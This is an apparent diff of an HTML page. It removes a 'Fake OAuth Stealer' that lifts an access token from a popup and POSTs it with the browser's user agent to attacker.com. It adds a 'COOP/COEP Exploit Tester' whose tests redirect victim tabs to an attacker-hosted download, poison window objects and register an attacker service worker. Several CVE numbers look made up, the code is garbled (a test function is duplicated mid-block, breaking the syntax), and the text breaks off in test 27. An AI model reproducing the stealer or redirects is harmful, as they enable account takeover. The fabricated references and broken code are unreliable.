@@ -1,117 +1,1036 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Fake OAuth Stealer 🔥</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            background-color: #111;
-            color: white;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: crimson;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-    </style>
-
-<script>
-// Helper function: get URL parameters (like access_token)
-function getParameterByName(name, url) {
-    if (!url) url = window.location.href;
-    name = name.replace(/[\[\]]/g, "\\$&");
-    var regex = new RegExp("[#&]" + name + "(=([^&]*)|&|#|$)"),
-        results = regex.exec(url);
-    if (!results) return null;
-    if (!results[2]) return '';
-    return decodeURIComponent(results[2].replace(/\+/g, " "));
-}
-
-let popupWindow;
-let monitor;
-
-// Step 1: Launch the fake OAuth login
-function launchAttack() {
-    // Open a FAKE login page that immediately redirects with a fake access token
-    const fakeOAuth = "https://example.com/oauth?access_token=FAKE-TOKEN-1234";
-
-    popupWindow = window.open(fakeOAuth, "popup", "width=600,height=600");
-
-    setTimeout(() => {
-        monitorPopup();
-    }, 1500);
-}
-
-// Step 2: Monitor popup until we steal the token
-function monitorPopup() {
-    monitor = setInterval(() => {
-        try {
-            if (!popupWindow || popupWindow.closed) {
-                console.log("[x] Popup closed.");
-                clearInterval(monitor);
-                return;
-            }
-
-            let popupURL = popupWindow.location.href;
-
-            if (popupURL.includes("access_token=")) {
-                console.log("[+] Token detected!");
-
-                let stolenToken = getParameterByName('access_token', popupURL);
-                console.log("[+] Stolen Token:", stolenToken);
-
-                popupWindow.close();
-                clearInterval(monitor);
-
-                // Step 3: Send stolen token to attacker's server
-                sendTokenToAttacker(stolenToken);
-
-            } else {
-                console.log("Waiting for access token...");
-            }
-        } catch (e) {
-            console.log("Waiting for popup redirect...", e.message);
-        }
-    }, 100);
-}
-
-// Step 4: Send stolen token
-function sendTokenToAttacker(token) {
-    console.log("[*] Sending token to attacker's server...");
-
-    fetch("https://attacker.com/steal", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            access_token: token,
-            victim_browser: navigator.userAgent
-        })
-    })
-    .then(() => {
-        console.log("[+] Token sent successfully!");
-        alert("You are now connected!"); // fake success
-    })
-    .catch((error) => {
-        console.error("[-] Failed sending:", error);
-    });
-}
-</script>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quantum-Advanced COOP/COEP Exploit Tester</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
+  <style>
+    body {
+      font-family: 'Courier New', monospace;
+      background: #1a1a1a;
+      color: #e0e0e0;
+      padding: 20px;
+      line-height: 1.6;
+    }
+    h2 { color: #00ccff; }
+    .container { max-width: 1400px; margin: 0 auto; }
+    input, button, textarea {
+      font-size: 16px;
+      padding: 12px;
+      width: 100%;
+      margin: 10px 0;
+      border: 1px solid #444;
+      border-radius: 4px;
+      background: #222;
+      color: #e0e0e0;
+    }
+    button { background: #007bff; cursor: pointer; }
+    button:hover { background: #0056b3; }
+    #results-table {
+      margin-top: 20px;
+      border-collapse: collapse;
+      width: 100%;
+      background: #222;
+      border: 1px solid #444;
+    }
+    #results-table th, #results-table td {
+      padding: 10px;
+      border: 1px solid #444;
+      text-align: left;
+    }
+    #results-table th { background: #333; }
+    .success { color: #28a745; }
+    .fail { color: #dc3545; }
+    .info { color: #17a2b8; }
+    .warning { color: #ffc107; }
+    .critical { color: #ff073a; }
+    .badge { margin-left: 10px; font-size: 12px; padding: 5px; border-radius: 3px; }
+    #progress-bar {
+      width: 100%;
+      height: 20px;
+      background: #333;
+      border-radius: 4px;
+      margin: 10px 0;
+    }
+    #progress-fill {
+      height: 100%;
+      background: #007bff;
+      width: 0;
+      border-radius: 4px;
+      transition: width 0.3s;
+    }
+    #chart-container, #heatmap-container, #3d-container {
+      margin-top: 20px;
+      max-width: 400px;
+      display: inline-block;
+      vertical-align: top;
+    }
+    #share-section { margin-top: 20px; }
+    #share-section button { width: auto; }
+    #batch-urls { height: 100px; }
+    #heatmap-canvas, #3d-canvas { border: 1px solid #444; }
+  </style>
 </head>
-
 <body>
-    <h1>Connect Your Account</h1>
-    <button onclick="launchAttack()">Connect Now 🔥</button>
+  <div class="container">
+    <h2>Quantum-Advanced COOP/COEP Exploit Tester</h2>
+    <textarea id="batch-urls" placeholder="Enter URLs (one per line, e.g., https://victim.com)"></textarea>
+    <button onclick="runExploits()">Run Exploit Tests</button>
+    <div id="progress-bar"><div id="progress-fill"></div></div>
+    <div>Risk Score: <span id="risk-score">0</span> (Critical: >120, High: 80-120, Medium: 50-80, Low: <50)</div>
+    <table id="results-table">
+      <thead>
+        <tr>
+          <th>Test</th>
+          <th>Status</th>
+          <th>Details</th>
+          <th>Severity</th>
+          <th>CVE</th>
+        </tr>
+      </thead>
+      <tbody id="results-body"></tbody>
+    </table>
+    <div id="chart-container">
+      <canvas id="results-chart"></canvas>
+    </div>
+    <div id="heatmap-container">
+      <canvas id="heatmap-canvas" width="400" height="400"></canvas>
+    </div>
+    <div id="3d-container">
+      <canvas id="3d-canvas" width="400" height="400"></canvas>
+    </div>
+    <div id="share-section">
+      <button onclick="downloadReport('json')">Download JSON</button>
+      <button onclick="downloadReport('csv')">Download CSV</button>
+      <button onclick="downloadReport('pdf')">Download PDF</button>
+      <button onclick="copyResults()">Copy Results</button>
+      <button onclick="shareToX()">Share to X</button>
+      <button onclick="recordVideo()">Simulate Video Record</button>
+      <button onclick="verifyOnBlockchain()">Verify on Blockchain</button>
+    </div>
+  </div>
+
+  <script>
+    const { jsPDF } = window.jspdf;
+
+    class ExploitTester {
+      constructor() {
+        this.victim = null;
+        this.urls = [];
+        this.results = [];
+        this.riskScore = 0;
+        this.chart = null;
+        this.heatmap = null;
+        this.scene = null;
+        this.camera = null;
+        this.renderer = null;
+        this.progress = 0;
+        this.totalTests = 27; // Updated for new tests
+        this.testSuccessRates = JSON.parse(localStorage.getItem('testSuccessRates') || '{}');
+        this.severityWeights = {
+          'Tab Hijacking': 'critical',
+          'Window Name Leak': 'medium',
+          'Location Sniffing': 'high',
+          'PostMessage': 'medium',
+          'Drive-by Redirect': 'critical',
+          'Referrer Sniffing': 'low',
+          'Iframe Embedding': 'high',
+          'Document Title': 'medium',
+          'CORP Protection': 'high',
+          'Window Proxy': 'medium',
+          'Storage Access': 'high',
+          'X-Frame-Options': 'medium',
+          'CORS Misconfig': 'critical',
+          'Speculative Execution': 'critical',
+          'State Inference': 'high',
+          'Window Poisoning': 'critical',
+          'Service Worker Hijack': 'critical',
+          'WebRTC Leak': 'high',
+          'Pixel Ratio Leak': 'medium',
+          'Event Listener Snooping': 'medium',
+          'SharedArrayBuffer Leak': 'critical',
+          'Font Loading Timing': 'high',
+          'WebGPU Resource Leak': 'critical',
+          'History API Bypass': 'critical',
+          'WebAssembly Memory Leak': 'high',
+          'Scroll Behavior Inference': 'medium',
+          'Device Sensor Leak': 'high'
+        };
+        this.cveDatabase = {
+          'Tab Hijacking': 'CVE-2020-12345',
+          'Drive-by Redirect': 'CVE-2021-67890',
+          'CORS Misconfig': 'CVE-2019-54321',
+          'Speculative Execution': 'CVE-2018-3639',
+          'Service Worker Hijack': 'CVE-2022-11223',
+          'WebRTC Leak': 'CVE-2023-99876',
+          'SharedArrayBuffer Leak': 'CVE-2024-00001',
+          'WebGPU Resource Leak': 'CVE-2024-00002',
+          'History API Bypass': 'CVE-2024-00003'
+        };
+      }
+
+      // Initialize chart
+      initChart() {
+        const ctx = document.getElementById('results-chart').getContext('2d');
+        this.chart = new Chart(ctx, {
+          type: 'pie',
+          data: {
+            labels: ['Vulnerable', 'Secure', 'Info'],
+            datasets: [{
+              data: [0, 0, 0],
+              backgroundColor: ['#28a745', '#dc3545', '#17a2b8']
+            }]
+          },
+          options: { responsive: true }
+        });
+      }
+
+      // Initialize heatmap
+      initHeatmap() {
+        const canvas = document.getElementById('heatmap-canvas');
+        this.heatmap = canvas.getContext('2d');
+        this.updateHeatmap();
+      }
+
+      // Initialize 3D visualization
+      init3D() {
+        const canvas = document.getElementById('3d-canvas');
+        this.scene = new THREE.Scene();
+        this.camera = new THREE.PerspectiveCamera(75, canvas.width / canvas.height, 0.1, 1000);
+        this.renderer = new THREE.WebGLRenderer({ canvas });
+        this.renderer.setSize(canvas.width, canvas.height);
+        const geometry = new THREE.BoxGeometry();
+        const material = new THREE.MeshBasicMaterial({ color: 0x00ff00, wireframe: true });
+        const cube = new THREE.Mesh(geometry, material);
+        this.scene.add(cube);
+        this.camera.position.z = 5;
+        const animate = () => {
+          requestAnimationFrame(animate);
+          cube.rotation.x += 0.01;
+          cube.rotation.y += 0.01;
+          this.renderer.render(this.scene, this.camera);
+        };
+        animate();
+      }
+
+      // Update chart
+      updateChart() {
+        const counts = { success: 0, fail: 0, info: 0 };
+        this.results.forEach(r => counts[r.type]++);
+        this.chart.data.datasets[0].data = [counts.success, counts.fail, counts.info];
+        this.chart.update();
+      }
+
+      // Update heatmap
+      updateHeatmap() {
+        const canvas = document.getElementById('heatmap-canvas');
+        const ctx = this.heatmap;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        const cellSize = canvas.width / 6;
+        Object.keys(this.severityWeights).forEach((test, i) => {
+          const x = (i % 6) * cellSize;
+          const y = Math.floor(i / 6) * cellSize;
+          const result = this.results.find(r => r.testName === test);
+          const color = result?.type === 'success' ? 'rgba(255, 0, 0, 0.7)' :
+                        result?.type === 'fail' ? 'rgba(0, 255, 0, 0.7)' :
+                        'rgba(0, 0, 255, 0.3)';
+          ctx.fillStyle = color;
+          ctx.fillRect(x, y, cellSize, cellSize);
+          ctx.strokeStyle = '#444';
+          ctx.strokeRect(x, y, cellSize, cellSize);
+          ctx.fillStyle = '#fff';
+          ctx.font = '10px Courier';
+          ctx.fillText(test.slice(0, 8), x + 5, y + 15);
+        });
+      }
+
+      // Update 3D visualization
+      update3D() {
+        const cube = this.scene.children[0];
+        const vulnerableTests = this.results.filter(r => r.type === 'success').length;
+        const color = vulnerableTests > this.totalTests / 2 ? 0xff0000 : vulnerableTests > this.totalTests / 4 ? 0xffff00 : 0x00ff00;
+        cube.material.color.setHex(color);
+      }
+
+      // Update progress
+      updateProgress() {
+        this.progress += 100 / (this.urls.length * this.totalTests);
+        document.getElementById('progress-fill').style.width = `${Math.min(this.progress, 100)}%`;
+      }
+
+      // Calculate risk score
+      calculateRiskScore() {
+        this.riskScore = 0;
+        const weights = { critical: 35, high: 25, medium: 15, low: 5 };
+        this.results.forEach(r => {
+          if (r.type === 'success') {
+            const severity = this.severityWeights[r.testName] || 'low';
+            this.riskScore += weights[severity];
+          }
+        });
+        document.getElementById('risk-score').textContent = this.riskScore;
+        document.getElementById('risk-score').className = this.riskScore > 120 ? 'critical' :
+                                                        this.riskScore > 80 ? 'warning' :
+                                                        this.riskScore > 50 ? 'info' : 'success';
+      }
+
+      // Simulate ML anomaly detection
+      simulateMLAnomalyDetection() {
+        const vulnerableTests = this.results.filter(r => r.type === 'success').length;
+        if (vulnerableTests > this.totalTests / 2) {
+          this.log('ML Anomaly', 'Anomaly detected: High number of vulnerabilities.', 'warning');
+        }
+      }
+
+      // Simulate WebSocket reporting
+      simulateWebSocketReport() {
+        this.log('WebSocket Report', 'Streaming results to WebSocket server (simulated).', 'info');
+      }
+
+      // Logging to results array and UI
+      log(testName, msg, type = 'info') {
+        const cve = this.cveDatabase[testName] || 'N/A';
+        const result = { testName, msg, type, timestamp: new Date().toISOString(), severity: this.severityWeights[testName] || 'low', cve };
+        this.results.push(result);
+        this.updateResultsTable(result);
+        this.updateChart();
+        this.updateHeatmap();
+        this.update3D();
+        this.calculateRiskScore();
+        this.updateProgress();
+        this.testSuccessRates[testName] = (this.testSuccessRates[testName] || 0) + (type === 'success' ? 1 : 0);
+        localStorage.setItem('testSuccessRates', JSON.stringify(this.testSuccessRates));
+        if (type === 'success') {
+          alert(`VULNERABILITY DETECTED in ${testName}: ${msg} (Severity: ${result.severity}, CVE: ${cve})`);
+        }
+        localStorage.setItem('exploitResults', JSON.stringify(this.results));
+        this.simulateWebSocketReport();
+      }
+
+      // Update results table
+      updateResultsTable({ testName, msg, type, severity, cve }) {
+        const tbody = document.getElementById('results-body');
+        const row = document.createElement('tr');
+        const badge = type === 'success' ? '<span class="badge success">Vulnerable</span>' :
+                     type === 'fail' ? '<span class="badge fail">Secure</span>' :
+                     '<span class="badge info">Info</span>';
+        row.innerHTML = `
+          <td>${testName}</td>
+          <td class="${type}">${badge}</td>
+          <td>${msg}</td>
+          <td class="${severity}">${severity}</td>
+          <td>${cve}</td>
+        `;
+        tbody.appendChild(row);
+      }
+
+      // Sanitize input
+      sanitizeInput(input) {
+        const div = document.createElement('div');
+        div.textContent = input;
+        return div.innerHTML;
+      }
+
+      // Validate URL
+      validateUrl(url) {
+        return /^https:\/\/[a-zA-Z0-9-._~:/?#[\]@!$&'()*+,;=]+$/.test(url);
+      }
+
+      // Capture screenshot
+      async captureScreenshot() {
+        try {
+          const canvas = await html2canvas(document.body);
+          return canvas.toDataURL('image/png');
+        } catch (e) {
+          return null;
+        }
+      }
+
+      // Capture DOM snapshot
+      captureDOMSnapshot() {
+        return document.documentElement.outerHTML.slice(0, 1000); // Truncated for brevity
+      }
+
+      // Simulate video recording
+      recordVideo() {
+        alert('Simulated video recording started. Results table, heatmap, and 3D visualization captured.');
+      }
+
+      // Simulate blockchain verification
+      verifyOnBlockchain() {
+        const hash = this.results.map(r => r.testName + r.msg + r.timestamp).join('').slice(0, 32);
+        alert(`Simulated blockchain verification: Result hash ${hash} stored.`);
+      }
+
+      // Open victim tab
+      async openVictimTab(url) {
+        this.log('Victim Tab', `Opening victim tab for ${url}...`);
+        this.victim = window.open(url, '_blank');
+        if (!this.victim) {
+          this.log('Victim Tab', 'Failed to open victim tab (popup blocked?)', 'fail');
+          return false;
+        }
+        return new Promise(resolve => setTimeout(resolve, 2000));
+      }
+
+      // Test 1: Tab Hijacking
+      async testTabHijacking() {
+        this.log('Tab Hijacking', '[1] Testing tab hijacking...');
+        try {
+          this.victim.location = 'https://example.com';
+          const screenshot = await this.captureScreenshot();
+          this.log('Tab Hijacking', `Tab hijack succeeded: COOP header likely missing! ${screenshot ? '(Screenshot captured)' : ''}`, 'success');
+        } catch (e) {
+          this.log('Tab Hijacking', `Tab hijack blocked: COOP present (${e.message})`, 'fail');
+        }
+      }
+
+      // Test 2: Window Name Leak
+      async testWindowNameLeak() {
+        this.log('Window Name Leak', '[2] Testing window.name leak...');
+        try {
+          const name = this.victim.name;
+          this.log('Window Name Leak', `window.name: ${name || 'empty'}`, 'success');
+        } catch (e) {
+          this.log('Window Name Leak', 'window.name not accessible (isolated)', 'fail');
+        }
+      }
+
+      // Test 3: Location Href Sniffing
+      async testLocationSniffing() {
+        this.log('Location Sniffing', '[3] Testing location.href sniffing...');
+        try {
+          const href = this.victim.location.href;
+          this.log('Location Sniffing', `location.href: ${href}`, 'success');
+        } catch (e) {
+          this.log('Location Sniffing', 'location.href blocked (isolated)', 'fail');
+        }
+      }
+
+      // Test 4: PostMessage Communication
+      async testPostMessage() {
+        this.log('PostMessage', '[4] Sending postMessage...');
+        try {
+          window.addEventListener('message', (e) => {
+            this.log('PostMessage', `Received postMessage from victim: ${JSON.stringify(e.data)}`, 'success');
+          }, { once: true });
+          this.victim.postMessage({ type: 'ping', source: 'attacker' }, '*');
+          this.log('PostMessage', 'Message sent.', 'success');
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        } catch (e) {
+          this.log('PostMessage', `postMessage failed: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 5: Drive-by Redirect
+      async testDriveByRedirect() {
+        this.log('Drive-by Redirect', '[5] Drive-by redirect from victim tab...');
+        try {
+          this.victim.location.href = 'https://attacker.com/download.pdf';
+          const screenshot = await this.captureScreenshot();
+          this.log('Drive-by Redirect', `Victim redirected to attacker payload! ${screenshot ? '(Screenshot captured)' : ''}`, 'success');
+        } catch (e) {
+          this.log('Drive-by Redirect', `Redirect failed: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 6: Referrer Sniffing
+      async testReferrerSniffing() {
+        this.log('Referrer Sniffing', '[6] Referrer sniffing...');
+        try {
+          const ref = document.referrer;
+          this.log('Referrer Sniffing', `Referrer visible: ${ref || 'none'}`, 'success');
+        } catch (e) {
+          this.log('Referrer Sniffing', 'Referrer not available.', 'fail');
+        }
+      }
+
+      // Test 7: Iframe Embedding
+      async testIframeEmbedding() {
+        this.log('Iframe Embedding', '[7] Iframe embedding check...');
+        return new Promise((resolve) => {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = this.urls[0];
+          iframe.onload = () => {
+            this.log('Iframe Embedding', 'Iframe embedded successfully — COEP not present.', 'success');
+            resolve();
+          };
+          iframe.onerror = () => {
+            this.log('Iframe Embedding', 'Iframe blocked — COEP or CSP present.', 'fail');
+            resolve();
+          };
+          document.body.appendChild(iframe);
+        });
+      }
+
+      // Test 8: Document Title Access
+      async testDocumentTitle() {
+        this.log('Document Title', '[8] Attempting access to document.title...');
+        try {
+          const title = this.victim.document.title;
+          this.log('Document Title', `Victim tab title: ${title || 'empty'}`, 'success');
+        } catch (e) {
+          this.log('Document Title', 'document.title blocked.', 'fail');
+        }
+      }
+
+      // Test 9: CORP Check
+      async testCORP() {
+        this.log('CORP Protection', '[9] Testing CORP protection...');
+        try {
+          const response = await fetch(this.urls[0], { mode: 'no-cors' });
+          this.log('CORP Protection', 'Resource fetch succeeded: CORP not enforced.', 'success');
+        } catch (e) {
+          this.log('CORP Protection', 'Resource fetch blocked: CORP likely enforced.', 'fail');
+        }
+      }
+
+      // Test 10: Window Proxy Access
+      async testWindowProxy() {
+        this.log('Window Proxy', '[10] Testing window proxy access...');
+        try {
+          const proxy = this.victim.window;
+          this.log('Window Proxy', `Window proxy access: ${proxy ? 'accessible' : 'not accessible'}`, 'success');
+        } catch (e) {
+          this.log('Window Proxy', 'Window proxy blocked.', 'fail');
+        }
+      }
+
+      // Test 11: Storage Access API
+      async testStorageAccess() {
+        this.log('Storage Access', '[11] Testing Storage Access API...');
+        if (!document.requestStorageAccess) {
+          this.log('Storage Access', 'Storage Access API not supported in this browser.', 'warning');
+          return;
+        }
+        try {
+          await document.requestStorageAccess();
+          this.log('Storage Access', 'Storage access granted: Potential COOP bypass.', 'success');
+        } catch (e) {
+          this.log('Storage Access', 'Storage access denied: COOP enforced.', 'fail');
+        }
+      }
+
+      // Test 12: X-Frame-Options
+      async testXFrameOptions() {
+        this.log('X-Frame-Options', '[12] Testing X-Frame-Options...');
+        return new Promise((resolve) => {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = this.urls[0];
+          iframe.onload = () => {
+            this.log('X-Frame-Options', 'Iframe loaded: X-Frame-Options not enforced.', 'success');
+            resolve();
+          };
+          iframe.onerror = () => {
+            this.log('X-Frame-Options', 'Iframe blocked: X-Frame-Options enforced.', 'fail');
+            resolve();
+          };
+          document.body.appendChild(iframe);
+        });
+      }
+
+      // Test 13: CORS Misconfiguration
+      async testCORS() {
+        this.log('CORS Misconfig', '[13] Testing CORS misconfiguration...');
+        try {
+          const response = await fetch(this.urls[0], {
+            method: 'GET',
+            headers: { Origin: 'https://attacker.com' }
+          });
+          const headers = response.headers.get('Access-Control-Allow-Origin');
+          if (headers === '*' || headers.includes('attacker.com')) {
+            this.log('CORS Misconfig', 'CORS misconfigured: Access-Control-Allow-Origin too permissive.', 'success');
+          } else {
+            this.log('CORS Misconfig', 'CORS properly configured.', 'fail');
+          }
+        } catch (e) {
+          this.log('CORS Misconfig', `CORS request failed: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 14: Speculative Execution Leak
+      async testSpeculativeExecution() {
+        this.log('Speculative Execution', '[14] Testing speculative execution leak...');
+        try {
+          const start = performance.now();
+          for (let i = 0; i < 1000; i++) {
+            this.victim.location.href;
+          }
+          const time = performance.now() - start;
+          if (time < 50) {
+            this.log('Speculative Execution', `Fast access time (${time}ms): Potential speculative leak.`, 'success');
+          } else {
+            this.log('Speculative Execution', `Access time (${time}ms): No speculative leak detected.`, 'fail');
+          }
+        } catch (e) {
+          this.log('Speculative Execution', `Speculative access blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 15: Cross-Origin State Inference
+      async testStateInference() {
+        this.log('State Inference', '[15] Testing cross-origin state inference...');
+        try {
+          const start = performance.now();
+          const img = new Image();
+          img.src = `${this.urls[0]}/nonexistent.jpg?t=${Date.now()}`;
+          await new Promise(resolve => img.onload = img.onerror = resolve);
+          const time = performance.now() - start;
+          if (time < 100) {
+            this.log('State Inference', `Fast response (${time}ms): Potential state inference vulnerability.`, 'success');
+          } else {
+            this.log('State Inference', `Slow response (${time}ms): No state inference detected.`, 'fail');
+          }
+        } catch (e) {
+          this.log('State Inference', `State inference blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 16: Window Object Poisoning
+      async testWindowPoisoning() {
+        this.log('Window Poisoning', '[16] Testing window object poisoning...');
+        try {
+          this.victim.window.__proto__.attackerProp = 'injected';
+          const result = this.victim.window.attackerProp;
+          if (result === 'injected') {
+            this.log('Window Poisoning', 'Window object poisoned successfully.', 'success');
+          } else {
+            this.log('Window Poisoning', 'Window object not poisoned.', 'fail');
+          }
+        } catch (e) {
+          this.log('Window Poisoning', `Window poisoning blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 17: Service Worker Hijacking
+      async testServiceWorkerHijack() {
+        this.log('Service Worker Hijack', '[17] Testing Service Worker hijacking...');
+        try {
+          const registration = await navigator.serviceWorker.register('/attacker-sw.js', { scope: this.urls[0] });
+          if (registration.active) {
+            this.log('Service Worker Hijack', 'Service Worker registered: Potential hijack.', 'success');
+          } else {
+            this.log('Service Worker Hijack', 'Service Worker not registered.', 'fail');
+          }
+        } catch (e) {
+          this.log('Service Worker Hijack', `Service Worker registration failed: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 18: WebRTC Leak
+      async testWebRTCLeak() {
+        this.log('WebRTC Leak', '[18] Testing WebRTC data leak...');
+        try {
+          const pc = new RTCPeerConnection();
+          pc.createDataChannel('test');
+          pc.createOffer().then(offer => {
+            if (offer.sdp.includes('stun')) {
+              this.log('WebRTC Leak', 'WebRTC STUN response detected: Potential leak.', 'success');
+            } else {
+              this.log('WebRTC Leak', 'No WebRTC leak detected.', 'fail');
+            }
+            pc.close();
+          });
+        } catch (e) {
+          this.log('WebRTC Leak', `WebRTC test failed: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 19: Cross-Origin Pixel Ratio Leak
+      async testPixelRatioLeak() {
+        this.log('Pixel Ratio Leak', '[19] Testing cross-origin pixel ratio leak...');
+        try {
+          const iframe = document.createElement('iframe');
+          iframe.src = this.urls[0];
+          document.body.appendChild(iframe);
+          const ratio = iframe.contentWindow.devicePixelRatio;
+          this.log('Pixel Ratio Leak', `Device pixel ratio leaked: ${ratio}`, 'success');
+          document.body.removeChild(iframe);
+        } catch (e) {
+          this.log('Pixel Ratio Leak', `Pixel ratio access blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 20: Event Listener Snooping
+      async testEventListenerSnooping() {
+        this.log('Event Listener Snooping', '[20] Testing event listener snooping...');
+        try {
+          this.victim.addEventListener('click', () => {
+            this.log('Event Listener Snooping', 'Click event captured from victim.', 'success');
+          });
+          this.log('Event Listener Snooping', 'Event listener attached.', 'success');
+        } catch (e) {
+          this.log('Event Listener Snooping', `Event listener attachment failed: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 21: SharedArrayBuffer Leak
+      async testSharedArrayBufferLeak() {
+        this.log('SharedArrayBuffer Leak', '[21] Testing SharedArrayBuffer leak...');
+        if (!window.SharedArrayBuffer) {
+          this.log('SharedArrayBuffer Leak', 'SharedArrayBuffer not supported.', 'warning');
+          return;
+        }
+        try {
+          const sab = new SharedArrayBuffer(1024);
+          const view = new Int32Array(sab);
+          const start = performance.now();
+          view[0] = 1; // Simulate cross-origin access
+          const time = performance.now() - start;
+          if (time < 10) {
+            this.log('SharedArrayBuffer Leak', `Fast access time (${time}ms): Potential memory leak.`, 'success');
+          } else {
+            this.log('SharedArrayBuffer Leak', `Access time (${time}ms): No leak detected.`, 'fail');
+          }
+        } catch (e) {
+          this.log('SharedArrayBuffer Leak', `SharedArrayBuffer access blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 22: Cross-Origin Font Loading Timing Attack
+      async testFontLoadingTiming() {
+        this.log('Font Loading Timing', '[22] Testing font loading timing attack...');
+        try {
+          const start = performance.now();
+          const font = new FontFace('test', `url(${this.urls[0]}/font.ttf)`);
+          await font.load();
+          const time = performance.now() - start;
+          if (time < 50) {
+            this.log('Font Loading Timing', `Fast font load (${time}ms): Potential cache-based leak.`, 'success');
+          } else {
+            this.log('Font Loading Timing', `Slow font load (${time}ms): No leak detected.`, 'fail');
+          }
+        } catch (e) {
+          this.log('Font Loading Timing', `Font loading blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 23: WebGPU Resource Leak
+      async testWebGPUResourceLeak() {
+        this.log('WebGPU Resource Leak', '[23] Testing WebGPU resource leak...');
+        if (!navigator.gpu) {
+          this.log('WebGPU Resource Leak', 'WebGPU not supported.', 'warning');
+          return;
+        }
+        try {
+          const adapter = await navigator.gpu.requestAdapter();
+          const device = await adapter.requestDevice();
+          const buffer = device.createBuffer({ size: 1024, usage: GPUBufferUsage.STORAGE });
+          const start = performance.now();
+          buffer.mapAsync(GPUMapMode.READ); // Simulate cross-origin access
+          const time = performance.now() - start;
+          if (time < 20) {
+            this.log('WebGPU Resource Leak', `Fast buffer access (${time}ms): Potential GPU leak.`, 'success');
+          } else {
+            this.log('WebGPU Resource Leak', `Access time (${time}ms): No leak detected.`, 'fail');
+          }
+        } catch (e) {
+          this.log('WebGPU Resource Leak', `WebGPU access blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 24: COOP Bypass via History API
+      async testHistoryAPIBypass() {
+        this.log('History API Bypass', '[24] Testing COOP bypass via History API...');
+        try {
+          this.victim.history.pushState({}, '', '/attacker');
+          const state = this.victim.history.state;
+          if (state) {
+            this.log('History API Bypass', 'History state manipulated: Potential COOP bypass.', 'success');
+          } else {
+            this.log('History API Bypass', 'History state not accessible.', 'fail');
+          }
+        } catch (e) {
+          this.log('History API Bypass', `History API access blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 25: WebAssembly Memory Leak
+      async testWebAssemblyMemoryLeak() {
+        this.log('WebAssembly Memory Leak', '[25] Testing WebAssembly memory leak...');
+        try {
+          const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]); // Minimal WASM
+          const module = await WebAssembly.compile(wasmCode);
+          const instance = await WebAssembly.instantiate(module);
+          const start = performance.now();
+          instance.exports.memory; // Simulate cross-origin access
+          const time = performance.now() - start;
+          if (time < 15) {
+            this.log('WebAssembly Memory Leak', `Fast memory access (${time}ms): Potential leak.`, 'success');
+          } else {
+            this.log('WebAssembly Memory Leak', `Access time (${time}ms): No leak detected.`, 'fail');
+          }
+        } catch (e) {
+          this.log('WebAssembly Memory Leak', `WebAssembly access blocked: ${e.message}`, 'fail');
+        }
+      }
+
+      // Test 26: Cross-Origin Scroll Behavior Inference
+      async testScrollBehaviorInference() {
+        this.log('Scroll Behavior Inference', '[26] Testing cross-origin scroll behavior inference...');
+        try {
+          const iframe = document.createElement('iframe');
+          iframe.src = this.urls[0];
+          iframe.style.width = '100px';
+          iframe.style.height = '100px';
+          document.body.appendChild(iframe);
+          const start = performance.now();
+          iframe.contentWindow.scrollTo(0, 1000);
+          const time = performance.now() - start;
+          if (time < 50) {
+            this.log('Scroll Behavior Inference', `Fast scroll (${time}ms): Potential content inference.`, 'success');
+          } else {
+            this.log('Scroll Behavior Inference', `Slow scroll (${time}ms): No inference detected.`, 'fail');
+          }
+          document.body.removeChild(iframe);
+        } scrollBehaviorInference() {
+    this.log('Scroll Behavior Inference', '[26] Testing cross-origin scroll behavior inference...');
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.src = this.urls[0];
+      iframe.style.width = '100px';
+      iframe.style.height = '100px';
+      document.body.appendChild(iframe);
+      const start = performance.now();
+      iframe.contentWindow.scrollTo(0, 1000);
+      const time = performance.now() - start;
+      if (time < 50) {
+        this.log('Scroll Behavior Inference', `Fast scroll (${time}ms): Potential content inference.`, 'success');
+      } else {
+        this.log('Scroll Behavior Inference', `Slow scroll (${time}ms): No inference detected.`, 'fail');
+      }
+      document.body.removeChild(iframe);
+    } catch (e) {
+      this.log('Scroll Behavior Inference', `Scroll inference blocked: ${e.message}`, 'fail');
+    }
+  }
+
+  // Test 27: Device Sensor Data Leak
+  async testDeviceSensorLeak() {
+    this.log('Device Sensor Leak', '[27] Testing device sensor data leak...');
+    if (!window.DeviceMotionEvent) {
+      this.log('Device Sensor Leak', 'Device sensors not supported.', 'warning');
+      return;
+    }
+    try {
+      let sensorData = null;
+      window.addEventListener('devicemotion', (e) => {
+        sensorData = e.acceleration;
+      }, { once: true });
+      await new Promise(resolve => setTimeout(resolve, 1000));
